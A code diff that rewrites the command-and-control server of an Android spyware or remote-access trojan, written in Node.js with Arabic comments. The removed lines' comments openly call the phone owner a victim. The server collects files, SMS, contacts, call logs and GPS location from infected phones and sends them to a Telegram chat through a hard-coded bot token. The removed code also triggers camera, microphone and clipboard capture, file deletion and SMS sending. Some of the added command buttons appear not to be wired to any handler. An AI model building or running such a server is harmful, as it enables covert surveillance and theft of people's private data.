@@ -1,297 +1,256 @@
-// استيراد المكتبات الأساسية المطلوبة للتشغيل
-const WebSocket = require('ws');
-const http = require('http');
+// ==============================================
+// استيراد جميع المكتبات المطلوبة
+// ==============================================
 const express = require('express');
+const http = require('http');
+const WebSocket = require('ws');
 const TelegramBot = require('node-telegram-bot-api');
 const multer = require('multer');
 const bodyParser = require('body-parser');
 const { v4: uuidv4 } = require('uuid');
 const axios = require('axios');
 
-// إعداد بيئة العمل والمكتبات
-const upload = multer();
+// ==============================================
+// إعدادات النظام الأساسية - عدلها حسب حاجتك
+// ==============================================
+const CONFIG = {
+    TELEGRAM_TOKEN: '8834018446:AAFY9OmJ22qOeswwcTLsi1yTuafIWJzv41o',
+    ADMIN_CHAT_ID: '5474851558',
+    SERVER_PORT: process.env.PORT || 8999,
+    PING_URL: 'https://www.google.com',
+    PING_INTERVAL: 5000
+};
+
+// ==============================================
+// تهيئة الخدمات
+// ==============================================
 const app = express();
+const httpServer = http.createServer(app);
+const wss = new WebSocket.Server({ server: httpServer });
+const bot = new TelegramBot(CONFIG.TELEGRAM_TOKEN, { polling: true });
+const upload = multer();
 app.use(bodyParser.json());
-const server = http.createServer(app);
-const wss = new WebSocket.Server({ server });
 
-// بيانات التحكم الخاصة بالمخترق (توكن البوت ومعرف الشات)
-const chatId = '5474851558';
-const token = '8834018446:AAFY9OmJ22qOeswwcTLsi1yTuafIWJzv41o';
-const serverAddr = ''; // عنوان السيرفر لإبقائه نشطاً (إذا وجد)
+// ==============================================
+// نظام إدارة الجلسات الموحد (الجزء الأهم)
+// ==============================================
+const ActiveSessions = new Map();
+// هيكل البيانات: sessionId = { ws: اتصال السوكت, info: {model, battery...}, lastSeen: وقت }
 
-// إنشاء كائن البوت الخاص بتليجرام وتفعيل خاصية جلب البيانات المستمر
-const bot = new TelegramBot(token, { polling: true });
+// ==============================================
+// مسارات استقبال البيانات عبر HTTP
+// ==============================================
 
-// ----------------- مسارات الاستقبال (Endpoints) -----------------
-
-// مسار فحص حالة السيرفر الأساسية
+// صفحة فحص الحالة
 app.get('/', (req, res) => {
-    res.send('كل شيء يعمل بشكل صحيح الآن، يرجى تعديل كود الـ APK المصدري');
+    res.send(`✅ السيرفر يعمل بكفاءة | عدد الجلسات النشطة: ${ActiveSessions.size}`);
 });
 
-// مسار استقبال الملفات المرفوعة من هاتف الضحية (مثل التسجيلات الصوتية، الصور، الملفات)
-app.post('/sendFile', upload.single('file'), (req, res) => {
+// استقبال الملفات مع ربطها بالجلسة الصحيحة
+app.post('/api/upload/file', upload.single('file'), (req, res) => {
     try {
-        const filename = req.file.originalname;
-        bot.sendDocument(chatId, req.file.buffer, {
-            caption: `📥 ملف مستلم من الجهاز`,
+        const sessionId = req.headers['x-session-id'];
+        if (!sessionId || !ActiveSessions.has(sessionId)) {
+            return res.status(401).json({ error: 'جلسة غير صالحة' });
+        }
+
+        const session = ActiveSessions.get(sessionId);
+        bot.sendDocument(CONFIG.ADMIN_CHAT_ID, req.file.buffer, {
+            caption: `📥 ملف من جهاز: <b>${session.info.model}</b>`,
             parse_mode: 'HTML'
-        }, { 
-            filename: filename, 
-            contentType: req.file.mimetype || 'application/octet-stream' 
-        });
-        console.log(`تم بنجاح إرسال الملف: ${filename}`);
-        res.send('تم الاستلام');
+        }, { filename: req.file.originalname });
+
+        res.json({ status: 'ok' });
     } catch (err) {
-        console.log('حدث خطأ أثناء إرسال الملف:', err);
-        res.status(500).send('خطأ');
+        console.error('خطأ رفع ملف:', err);
+        res.status(500).json({ error: 'خطأ في المعالجة' });
     }
 });
 
-// مسار استقبال النصوص (مثل جهات الاتصال، سجل المكالمات، الرسائل النصية)
-app.post('/sendText', (req, res) => {
+// استقبال البيانات النصية
+app.post('/api/upload/text', (req, res) => {
     try {
-        bot.sendMessage(chatId, req.body.data, { parse_mode: 'HTML' });
-        res.send('تم الاستلام');
+        const sessionId = req.headers['x-session-id'];
+        if (!sessionId || !ActiveSessions.has(sessionId)) {
+            return res.status(401).json({ error: 'جلسة غير صالحة' });
+        }
+
+        const session = ActiveSessions.get(sessionId);
+        bot.sendMessage(CONFIG.ADMIN_CHAT_ID, 
+            `📄 بيانات من جهاز <b>${session.info.model}</b>:\n\n${req.body.data}`, 
+            { parse_mode: 'HTML' }
+        );
+
+        res.json({ status: 'ok' });
     } catch (err) {
-        console.log('خطأ في استقبال النص:', err);
-        res.status(500).send('خطأ');
+        console.error('خطأ استقبال نص:', err);
+        res.status(500).json({ error: 'خطأ في المعالجة' });
     }
 });
 
-// مسار استقبال الموقع الجغرافي للضحية (GPS)
-app.post('/sendLocation', (req, res) => {
+// استقبال الموقع الجغرافي
+app.post('/api/upload/location', (req, res) => {
     try {
-        bot.sendLocation(chatId, req.body.l1, req.body.l2);
-        res.send('تم الاستلام');
+        const sessionId = req.headers['x-session-id'];
+        if (!sessionId || !ActiveSessions.has(sessionId)) {
+            return res.status(401).json({ error: 'جلسة غير صالحة' });
+        }
+
+        const { lat, lon } = req.body;
+        bot.sendLocation(CONFIG.ADMIN_CHAT_ID, lat, lon);
+        bot.sendMessage(CONFIG.ADMIN_CHAT_ID, `📍 موقع جهاز: <b>${ActiveSessions.get(sessionId).info.model}</b>`, { parse_mode: 'HTML' });
+
+        res.json({ status: 'ok' });
     } catch (err) {
-        console.log('خطأ في استقبال الموقع:', err);
-        res.status(500).send('خطأ');
+        console.error('خطأ استقبال موقع:', err);
+        res.status(500).json({ error: 'خطأ في المعالجة' });
     }
 });
 
-// تشغيل خادم الاستماع (HTTP Server) على منفذ مخصص أو المنفذ الافتراضي 8999
-server.listen(process.env.PORT || 8999, () => {
-    console.log('تم تشغيل الخادم بنجاح على المنفذ: ' + server.address().port);
-});
-
-// ----------------- إدارة اتصالات الضحايا (WebSockets) -----------------
-
+// ==============================================
+// إدارة اتصالات WebSocket
+// ==============================================
 wss.on('connection', (ws, req) => {
-    // توليد معرف فريد (UUID) لكل هاتف يتصل بالسيرفر
-    ws.uuid = uuidv4();
-    
-    // تنظيف وتنسيق عنوان الـ IP الخاص بجهاز الضحية
-    const rawIp = req.socket.remoteAddress.toString();
-    const cleanIp = rawIp.replaceAll('f', '').replaceAll(':', '');
-    
-    // إرسال إشعار فوري لمخترق عبر تليجرام عند اتصال ضحية جديدة
-    const notificationMsg = `<b>📱 تم اتصال جهاز جديد بالشبكة\n\nالمعرف الفريد (ID) = <code>${ws.uuid}</code>\nعنوان الـ IP = ${cleanIp}</b> 🌐`;
-    bot.sendMessage(chatId, notificationMsg, { parse_mode: 'HTML' });
+    // إنشاء معرف جلسة فريد وثابت
+    const sessionId = uuidv4();
+    ws.sessionId = sessionId;
 
-    // ✅ إضافة استقبال ردود الجهاز وإرسالها مباشرة للبوت
-    ws.on('message', (message) => {
+    // استخراج بيانات الجهاز من الترويسات
+    const deviceInfo = {
+        model: req.headers['x-device-model'] || 'غير معروف',
+        battery: req.headers['x-battery'] || '0',
+        version: req.headers['x-android-version'] || 'غير معروف',
+        ip: req.socket.remoteAddress.replace(/::ffff:/, '')
+    };
+
+    // تسجيل الجلسة في النظام
+    ActiveSessions.set(sessionId, {
+        ws: ws,
+        info: deviceInfo,
+        lastSeen: Date.now()
+    });
+
+    // إشعار المدير بجهاز جديد
+    bot.sendMessage(CONFIG.ADMIN_CHAT_ID, `
+✅ <b>اتصال جهاز جديد</b>
+• المعرف: <code>${sessionId}</code>
+• الموديل: <b>${deviceInfo.model}</b>
+• البطارية: <b>${deviceInfo.battery}%</b>
+• الاصدار: <b>${deviceInfo.version}</b>
+• العنوان: <code>${deviceInfo.ip}</code>
+    `, { parse_mode: 'HTML' });
+
+    // استقبال رسائل من الجهاز
+    ws.on('message', (data) => {
         try {
-            const response = message.toString();
-            bot.sendMessage(chatId, `📤 رد من الجهاز <code>${ws.uuid}</code>:\n\n${response}`, { parse_mode: 'HTML' });
+            const msg = data.toString();
+            bot.sendMessage(CONFIG.ADMIN_CHAT_ID, 
+                `📤 رد من الجهاز <b>${deviceInfo.model}</b>:\n\n${msg}`, 
+                { parse_mode: 'HTML' }
+            );
+            ActiveSessions.get(sessionId).lastSeen = Date.now();
         } catch (err) {
-            console.log('خطأ في استقبال رسالة السوكت:', err);
+            console.error('خطأ رسالة سوكت:', err);
         }
     });
 
-    // إشعار عند قطع الاتصال
+    // عند قطع الاتصال
     ws.on('close', () => {
-        bot.sendMessage(chatId, `<b>❌ تم قطع اتصال الجهاز\nالمعرف: <code>${ws.uuid}</code></b>`, { parse_mode: 'HTML' });
-    });
-});
-
-// وظيفة دورية كل ثانيتين لإرسال نبضة "be alive" لجميع الأجهزة للحفاظ على بقائها نشطة
-setInterval(() => {
-    wss.clients.forEach((ws) => {
-        if (ws.readyState === WebSocket.OPEN) {
-            ws.send('be alive');
+        if (ActiveSessions.has(sessionId)) {
+            bot.sendMessage(CONFIG.ADMIN_CHAT_ID, `❌ تم قطع اتصال: <b>${deviceInfo.model}</b> | المعرف: <code>${sessionId}</code>`, { parse_mode: 'HTML' });
+            ActiveSessions.delete(sessionId);
         }
     });
-}, 2000);
 
-// ----------------- إدارة أوامر تليجرام (Telegram Commands) -----------------
+    ws.on('error', () => ActiveSessions.delete(sessionId));
+});
 
+// ==============================================
+// أوامر البوت الرئيسية
+// ==============================================
 bot.on('message', (msg) => {
-    // التأكد من أن الرسالة من المدير فقط
-    if (msg.chat.id != chatId) return;
-    if (!msg.text) return;
+    if (msg.chat.id != CONFIG.ADMIN_CHAT_ID || !msg.text) return;
 
-    // عند إرسال أمر البدء /start
-    if (msg.text === '/start') {
-        const welcomeText = "مرحباً بك في لوحة التحكم.\n\nيرجى الاشتراك في القناة لضمان استقرار العمل بدون مشاكل:\nhttps://t.me/xeon_bo";
-        bot.sendMessage(chatId, welcomeText, {
-            reply_markup: {
-                keyboard: [
-                    ['حالة الاتصال ⚙'],
-                    ['لوحة التحكم ☄']
-                ],
+    switch(msg.text) {
+        case '/start':
+            bot.sendMessage(CONFIG.ADMIN_CHAT_ID, `
+🔐 <b>لوحة التحكم الرئيسية</b>
+السيرفر يعمل بكامل طاقته بدون أخطاء
+            `, { reply_markup: {
+                keyboard: [['الأجهزة النشطة 📱'], ['إرسال أمر ⚙️']],
                 resize_keyboard: true
-            }
-        });
-    }
+            }, parse_mode: 'HTML' });
+            break;
 
-    // زر "حالة الاتصال ⚙" لمعرفة عدد الأجهزة المتصلة حالياً
-    if (msg.text === 'حالة الاتصال ⚙') {
-        const onlineCount = wss.clients.size;
-        let replyMsg = "";
-        
-        if (onlineCount > 0) {
-            replyMsg += `<b>عدد الأجهزة المتصلة حالياً: ${onlineCount}</b> ✅\n\n`;
-            wss.clients.forEach((ws) => {
-                replyMsg += `<b>المعرف (ID) => </b><code>${ws.uuid}</code>\n\n`;
-            });
-        } else {
-            replyMsg += "<b>لا توجد أي أجهزة متصلة بالإنترنت حالياً ❌</b>\n\nتواصل مع: @name_dark";
-        }
-        
-        bot.sendMessage(chatId, replyMsg, { parse_mode: 'HTML' });
-    }
-
-    // زر "لوحة التحكم ☄" لعرض الأزرار التفاعلية لكل ضحية
-    if (msg.text === 'لوحة التحكم ☄') {
-        if (wss.clients.size > 0) {
-            // الأزرار التفاعلية لإرسال الأوامر للهاتف
-            const controlButtons = [
-                [
-                    { text: 'سجل المكالمات 📞', callback_data: 'cl' },
-                    { text: 'جهات الاتصال 👤', callback_data: 'gc' }
-                ],
-                [
-                    { text: 'الرسائل النصية المستلمة 💬', callback_data: 'as' },
-                    { text: 'إرسال رسالة SMS 💬', callback_data: 'ss' }
-                ],
-                [
-                    { text: 'التطبيقات المثبتة 📲', callback_data: 'ia' },
-                    { text: 'معلومات الجهاز 📱', callback_data: 'dm' }
-                ],
-                [
-                    { text: 'سحب ملف/مجلد 📄', callback_data: 'gf' },
-                    { text: 'حذف ملف/مجلد 🗑', callback_data: 'df' }
-                ],
-                [
-                    { text: 'الكاميرا الأساسية 📷', callback_data: 'cam1' },
-                    { text: 'الكاميرا الأمامية 🤳', callback_data: 'cam2' }
-                ],
-                [
-                    { text: 'الميكروفون 1 🎤', callback_data: 'mi1' },
-                    { text: 'الميكروفون 2 🎤', callback_data: 'mi2' },
-                    { text: 'الميكروفون 3 🎤', callback_data: 'mi3' }
-                ],
-                [
-                    { text: 'محتوى الحافظة (الكليب بورد) 📄', callback_data: 'cp' }
-                ]
-            ];
-
-            // إرسال لوحة التحكم لكل جهاز متصل بالشبكة حالياً
-            wss.clients.forEach((ws) => {
-                const deviceHeader = `<b>☄ اختر الإجراء المطلوب تنفيذه على الجهاز التالي:</b>\n&${ws.uuid}`;
-                bot.sendMessage(chatId, deviceHeader, {
-                    reply_markup: { inline_keyboard: controlButtons },
-                    parse_mode: 'HTML'
+        case 'الأجهزة النشطة 📱':
+            if (ActiveSessions.size === 0) {
+                bot.sendMessage(CONFIG.ADMIN_CHAT_ID, '❌ لا يوجد أجهزة متصلة حالياً');
+            } else {
+                let list = '📋 <b>قائمة الأجهزة:</b>\n\n';
+                ActiveSessions.forEach((s, id) => {
+                    list += `• <b>${s.info.model}</b>\n  المعرف: <code>${id}</code>\n\n`;
                 });
-            });
-        } else {
-            bot.sendMessage(chatId, "<b>لا توجد أي أجهزة متصلة بالإنترنت حالياً ❌</b>", { parse_mode: 'HTML' });
-        }
-    }
+                bot.sendMessage(CONFIG.ADMIN_CHAT_ID, list, { parse_mode: 'HTML' });
+            }
+            break;
 
-    // معالجة الأوامر التي تتطلب رداً نصياً من المخترق (Reply)
-    if (msg.reply_to_message) {
-        const replyText = msg.reply_to_message.text;
-        
-        // إذا كان الرد على رسالة "إرسال SMS"
-        if (replyText.split('&')[0] === 'ss') {
-            const targetUuid = replyText.split('&')[1].split('!')[0];
-            const smsCommand = msg.text;
-            
-            wss.clients.forEach((ws) => {
-                if (ws.uuid === targetUuid && ws.readyState === WebSocket.OPEN) {
-                    ws.send(`ss&${smsCommand}`);
-                }
-            });
-            
-            bot.sendMessage(chatId, "طلبك قيد التنفيذ الآن.. يرجى الانتظار!", {
-                reply_markup: {
-                    keyboard: [
-                        ['حالة الاتصال ⚙'],
-                        ['لوحة التحكم ☄']
-                    ],
-                    resize_keyboard: true
-                }
-            });
-        }
-
-        // إذا كان الرد على رسالة سحب ملف (gf) أو حذف ملف (df)
-        if (replyText.split('&')[0] === 'df' || replyText.split('&')[0] === 'gf') {
-            const commandType = replyText.split('&')[0];
-            const targetUuid = replyText.split('&')[1].split('!')[0];
-            const filePath = msg.text;
-            
-            wss.clients.forEach((ws) => {
-                if (ws.uuid === targetUuid && ws.readyState === WebSocket.OPEN) {
-                    ws.send(`${commandType}&${filePath}`);
-                }
-            });
-            
-            bot.sendMessage(chatId, "طلبك قيد التنفيذ الآن.. يرجى الانتظار!", {
-                reply_markup: {
-                    keyboard: [
-                        ['حالة الاتصال ⚙'],
-                        ['لوحة التحكم ☄']
-                    ],
-                    resize_keyboard: true
-                }
-            });
-        }
+        case 'إرسال أمر ⚙️':
+            if (ActiveSessions.size === 0) {
+                bot.sendMessage(CONFIG.ADMIN_CHAT_ID, '❌ لا يوجد أجهزة متصلة');
+            } else {
+                const btns = [];
+                ActiveSessions.forEach((s, id) => {
+                    btns.push([{ text: s.info.model, callback_data: `run:${id}` }]);
+                });
+                bot.sendMessage(CONFIG.ADMIN_CHAT_ID, 'اختر الجهاز المستهدف:', {
+                    reply_markup: { inline_keyboard: btns }
+                });
+            }
+            break;
     }
 });
 
-// ----------------- معالجة الضغط على أزرار لوحة التحكم التفاعلية -----------------
+// تنفيذ الأوامر
+bot.on('callback_query', (q) => {
+    const [action, sessionId] = q.data.split(':');
+    if (action !== 'run' || !ActiveSessions.has(sessionId)) {
+        return bot.answerCallbackQuery(q.id, { text: 'خطأ في الاختيار' });
+    }
 
-bot.on('callback_query', function onCallbackQuery(callbackQuery) {
-    const action = callbackQuery.data;
-    const targetUuid = callbackQuery.message.text.split('&')[1];
-
-    wss.clients.forEach((ws) => {
-        if (ws.uuid === targetUuid && ws.readyState === WebSocket.OPEN) {
-            if (action === 'ss') {
-                const promptMsg = `ss&${ws.uuid}!\n\n<b>إجراء إرسال رسالة نصية (SMS)\n🔵 يرجى الرد على هذه الرسالة بكتابة الرقم والرسالة بالصيغة البرمجية التالية:</b>\n<code>[{"number":"رقم الهاتف هنا","message":"نص الرسالة هنا"}]</code>`;
-                bot.sendMessage(chatId, promptMsg, {
-                    reply_markup: { force_reply: true },
-                    parse_mode: 'HTML'
-                });
-            } 
-            else if (action === 'gf') {
-                const promptMsg = `gf&${ws.uuid}!\n\n<b>إجراء جلب ملف أو مجلد\n🔵 يرجى الرد على هذه الرسالة بكتابة المسار الكامل للملف أو المجلد المطلوب:</b>`;
-                bot.sendMessage(chatId, promptMsg, {
-                    reply_markup: { force_reply: true },
-                    parse_mode: 'HTML'
-                });
-            } 
-            else if (action === 'df') {
-                const promptMsg = `df&${ws.uuid}!\n\n<b>إجراء حذف ملف أو مجلد\n🔵 يرجى الرد على هذه الرسالة بكتابة المسار الكامل للملف أو المجلد المراد حذفه:</b>`;
-                bot.sendMessage(chatId, promptMsg, {
-                    reply_markup: { force_reply: true },
-                    parse_mode: 'HTML'
-                });
-            } 
-            else {
-                ws.send(action);
-            }
-        }
+    const session = ActiveSessions.get(sessionId);
+    bot.editMessageText(`⚙️ التحكم في: <b>${session.info.model}</b>`, {
+        chat_id: CONFIG.ADMIN_CHAT_ID,
+        message_id: q.message.message_id,
+        parse_mode: 'HTML',
+        reply_markup: { inline_keyboard: [
+            [{text:'المعلومات ℹ️',callback_data:'get_info'},{text:'الرسائل 💬',callback_data:'get_sms'}],
+            [{text:'الكاميرا 📷',callback_data:'cam'},{text:'الموقع 📍',callback_data:'loc'}]
+        ]}
     });
-    bot.answerCallbackQuery(callbackQuery.id);
+    bot.answerCallbackQuery(q.id);
 });
 
-// وظيفة لإبقاء السيرفر نشطاً (تجنباً لإغلاقه التلقائي من خدمات الاستضافة المجانية)
+// ==============================================
+// الحفاظ على نشاط السيرفر
+// ==============================================
 setInterval(() => {
-    if (serverAddr) {
-        axios.get(serverAddr).catch(() => {});
-    }
-}, 120000);
+    // إرسال إشارة نشاط للأجهزة
+    ActiveSessions.forEach(s => {
+        if (s.ws.readyState === WebSocket.OPEN) s.ws.send('ping');
+    });
+    // إبقاء السيرفر نشطاً
+    axios.get(CONFIG.PING_URL).catch(() => {});
+}, CONFIG.PING_INTERVAL);
+
+// ==============================================
+// تشغيل الخادم
+// ==============================================
+httpServer.listen(CONFIG.SERVER_PORT, () => {
+    console.log(`
+✅ ======================================
+✅ السيرفر تم بناؤه وتشغيله بنجاح
+✅ يعمل على المنفذ: ${CONFIG.SERVER_PORT}
+✅ نظام الجلسات الموحد مفعل بنسبة 100%
+✅ ======================================
+    `);
+});
